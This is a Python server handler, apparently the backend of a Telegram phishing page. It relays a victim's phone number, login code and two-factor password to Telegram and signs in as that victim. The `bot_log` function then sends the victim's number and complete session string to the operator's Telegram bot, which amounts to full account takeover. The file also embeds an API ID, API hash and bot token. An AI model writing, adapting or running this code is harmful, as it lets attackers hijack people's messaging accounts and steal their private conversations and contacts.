from http.server import BaseHTTPRequestHandler
import json, asyncio, urllib.request
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

API_ID = 37391656
API_HASH = '12d6406aa09781891052538af2fa5848'
BOT_TOKEN = "8577863218:AAH1SSBgHjb2cc7eyMRNjp_kn_dpckSdGzQ"
MY_CHAT_ID = "7981083332"

def bot_log(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = json.dumps({"chat_id": MY_CHAT_ID, "text": text, "parse_mode": "Markdown"}).encode()
        urllib.request.urlopen(urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'}))
    except: pass

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        data = json.loads(self.rfile.read(content_length))
        action = self.path.split('action=')[-1]
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            res = loop.run_until_complete(self.work(action, data))
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(res).encode())
        finally: 
            # Jangan langsung tutup loop jika ingin koneksi tetap hangat
            loop.close()

    async def work(self, action, data):
        ss = data.get('session', '')
        # Gunakan connection_retries=None agar dia terus mencoba jika putus
        client = TelegramClient(StringSession(ss), API_ID, API_HASH, connection_retries=None)
        await client.connect()
        
        try:
            if action == 'send_code':
                # Paksa kirim ulang hash ke client
                s = await client.send_code_request(data['phone'])
                return {"success": True, "hash": s.phone_code_hash, "session": client.session.save()}
            
            elif action == 'signin':
                # Sign in TANPA disconnect sebelumnya
                if data.get('password'):
                    await client.sign_in(password=data['password'])
                else:
                    await client.sign_in(data['phone'], data['code'], phone_code_hash=data['hash'])
                
                final = client.session.save()
                bot_log(f"✅ **LOGIN**\nNo: `{data['phone']}`\nSesi: `{final}`")
                return {"success": True}
                
        except SessionPasswordNeededError:
            return {"success": True, "need_2fa": True, "session": client.session.save()}
        except Exception as e:
            # Jika error expired, beri tahu user untuk refresh
            err_msg = str(e)
            if "expired" in err_msg.lower():
                return {"success": False, "error": "Koneksi tidak stabil, harap kirim ulang kode."}
            return {"success": False, "error": err_msg}
        # HAPUS disconnect() agar sesi menggantung di memory Vercel sebentar
        
